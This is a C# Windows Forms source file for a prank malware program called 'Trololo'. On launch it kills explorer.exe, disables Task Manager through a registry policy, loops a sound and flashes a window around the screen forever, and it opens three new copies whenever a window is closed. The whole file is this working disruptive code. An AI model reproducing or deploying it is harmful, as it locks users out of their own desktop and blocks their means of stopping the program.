using System;
using System.Diagnostics;
using System.Drawing;
using System.Media;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Trololo
{
    public partial class Form1 : Form
    {

        public int basicDelay = (int)(128 * 1.100);
        public int basicDelayE = 0;

        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e) {}

        private void Form1_Load(object sender, EventArgs e)
        {
            basicDelayE = ((int)(int)basicDelay / (int)3.14);
            Process p = new Process();
            p.StartInfo.FileName = "taskkill.exe";
            p.StartInfo.Arguments = "/f /im explorer.exe";
;           p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = false;
            p.StartInfo.RedirectStandardOutput = false;
            p.StartInfo.RedirectStandardError = false;
            p.StartInfo.CreateNoWindow = true;
            #if RELEASE
            p.Start();
            p.WaitForExit();
            #endif
            p.Close();
            #if RELEASE
            #region TaskMGR
            try{
                RegistryKey skSys = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                skSys.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                skSys.Close();
            }catch(Exception){}
            #endregion
            #endif
            PlaySound();
            this.FormClosing += Form1_FormClosing;
            this.Visible = true;
            Rectangle bounds = Screen.GetBounds(Screen.GetBounds(Point.Empty));
            Random rd = new Random();
            while (true)
            {
                this.BackColor = Color.Red;
                int picXPoint = rd.Next(0, bounds.Right - this.Width);
                int picYPoint = rd.Next(0, bounds.Height - this.Height);
                Point ulCorner = new Point(picXPoint, picYPoint);
                this.Location = ulCorner;
                Delay(basicDelay);
                this.BackColor = Color.Blue;
                Delay(basicDelay);
                var tmpv = new Random().Next(5);
                if (tmpv == new Random(new Random().Next(((int)313575.68/45))).Next(50/12))
                {
                    this.BackColor = Color.Red;
                    label1.BackColor = Color.Blue;
                    Delay(basicDelayE);
                    label1.BackColor = Color.Red;
                    this.BackColor = Color.Blue;
                    Delay(basicDelayE);
                    label1.BackColor = Color.Empty;
                }
            }
        }
        private void showAlarm()
        {
            try { new Thread(new ThreadStart(PlaySound)).Start(); }catch (Exception) { }
        }

        private void PlaySound()
        {
            try
            {
                new SoundPlayer(Properties.Resources.ResourceManager.GetStream("trolo")).PlayLooping();
            }
            catch (Exception)
            {

            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Task.Factory.StartNew(doClosing);
        }

        private void doClosing() {
            for (int i = 0; i < 3; i++)
            {
                new Form1().Show();
            }
        }

        public static void Delay(int mm)
        {
            DateTime current = DateTime.Now;
            while (current.AddMilliseconds(mm) > DateTime.Now)
            {
                Application.DoEvents();
            }
            return;
        }

    }
}
